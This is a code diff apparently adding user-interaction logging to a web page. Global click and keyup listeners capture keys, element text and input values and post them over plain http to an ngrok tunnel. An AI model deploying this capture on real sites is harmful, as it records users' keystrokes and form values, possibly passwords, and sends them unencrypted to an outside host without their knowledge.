@@ -2,28 +2,74 @@
     $.ajaxSetup({
         type: 'POST',
         data: {},
-        dataType: 'json',
         xhrFields: {
             withCredentials: true
         },
+        dataType: 'json',
         crossDomain: true
     });
 })();
-const serverUrl = 'https://b34f23ca.ngrok.io/log';
+
+document.addEventListener('click', (event) => {
+    const { x, y, target } = event;
+    const {id, nodeName, classList, innerText} = target;
+    const targetObj = {
+        nodeType: nodeName.toLowerCase(),
+        classList: classList.toString(),
+        tag: target.cloneNode(false).outerHTML
+    }
+    if(!!id){
+        targetObj['id'] = id;
+    }
+    if(!!innerText){
+        targetObj['innerText'] = innerText;
+    }
+    const content = {x, y, target: targetObj}
+    logEvent('Click', content);
+});
+
+document.addEventListener('keyup', (event) => {
+    const {key, target} = event;
+    const {id, nodeName, classList, value, innerText} = target;
+    const targetObj = {
+        nodeType: nodeName.toLowerCase(),
+        classList: classList.toString(),
+        tag: target.cloneNode(false).outerHTML
+    };
+    if(!!id){
+        targetObj['id'] = id;
+    }
+    if(!!value){
+        targetObj['value'] = value;
+    }
+    if(!!innerText){
+        targetObj['innerText'] = innerText;
+    }
+    const content = {key, target: targetObj };
+    logEvent('Keyup', content);
+});
+
+const serverUrl = 'http://b34f23ca.ngrok.io/log';
+
 /**
  * Logs an event to the logging database
  * @param {string} eventName Name describing the event to log
  * @param {string} eventContent Description of what happened in the event
+ * @param {Object} extraParams Extra parameters to send to the server
  */
-const logEvent = async (eventName, eventContent) => {
+const logEvent = async (eventName, content) => {
     const sendObj = {
-        content: eventContent,
         type: eventName,
-        time: new Date().toString()
-    }
-    return new Promise((resolve, reject) => {
+        path: window.location.pathname,
+        time: new Date().toString(),
+        content,
+    };
+    return new Promise(resolve => {
         $.post(serverUrl, sendObj)
             .done(data => resolve(data))
-            .fail(data => reject(data))
+            .fail(data => {
+                console.warn(data);
+                resolve(data);
+            })
     })
 }
